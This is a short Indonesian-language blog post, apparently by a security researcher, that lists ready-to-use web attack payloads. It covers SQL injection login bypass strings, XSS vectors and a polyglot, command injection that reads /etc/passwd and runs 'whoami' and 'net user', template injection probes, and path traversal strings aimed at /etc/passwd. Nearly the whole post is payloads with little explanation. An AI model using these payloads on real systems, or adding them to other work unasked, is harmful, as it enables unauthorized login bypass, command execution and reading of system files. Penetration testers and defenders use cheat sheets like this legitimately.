---
title: Payloads for Security Researchers
excerpt: Ini adalah bagian dari instruksi yang dieksekusi untuk mengeksploitasi kerentanan dalam sistem.
date: 2025-03-31 01:37:00
tags: [securityresearcher]
categories:
  - [Security Researcher]
index_img: https://raw.githubusercontent.com/1337rokudenashi/1337rokudenashi.github.io/main/yublueflower.jpg
banner_img: https://raw.githubusercontent.com/1337rokudenashi/1337rokudenashi.github.io/main/1337yublueflower.jpg
---

Ini adalah bagian dari instruksi yang dieksekusi untuk mengeksploitasi kerentanan dalam sistem. 

**Payloads for SQL Injection Authentication Bypass**

- `' or 1=1 limit 1 -- -+`
- `'="or'`

**Payloads for Cross-Site Scripting**

- `"><script>alert('vulnerable')</script>`
- `"><img src=vulnerable onerror=alert('vulnerable') />`
- `"><svg onload=alert('vulnerable')>`
- `"><input type=image src onerror="alert('vulnerable')">`

**XSS Polyglots**

Poliglot XSS adalah string yang mampu disuntikkan ke dalam beberapa konteks yang berbeda dan masih menghasilkan eksekusi JavaScript, ini bekerja di lebih dari 20 konteks.

- payload for xss polyglots
```polyglots
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>x3csVg/<sVg/oNloAd=alert()//>x3e
```

Kelemahan poliglot adalah mudah terdeteksi oleh firewall aplikasi web (WAF), mereka cenderung cukup panjang dalam hal panjang karakter, dan mereka tidak berfungsi di setiap konteks.

**Payloads for Command Injection**

- `; uname -a; cat /etc/passwd`
- `& cmd /c "whoami & net user"`

**Payloads for Server-Side Template Injection**

- `{{ 13*37 }}`
- `${{13*37}}`
- `<%= 13*37 %>`
- `#{13*37}`
- `{{= 13*37 }}`

**Payloads for Path Traversal**

- `../../../etc/passwd`
- `/etc/passwd`
- `....//....//....//etc/passwd`
- `..%252f..%252f..%252fetc/passwd`
- `../../../etc/passwd%00.png`

Ini telah disesuaikan untuk peneliti keamanan melakukan pengujian kerentanan yang lebih luas dan mendalam.
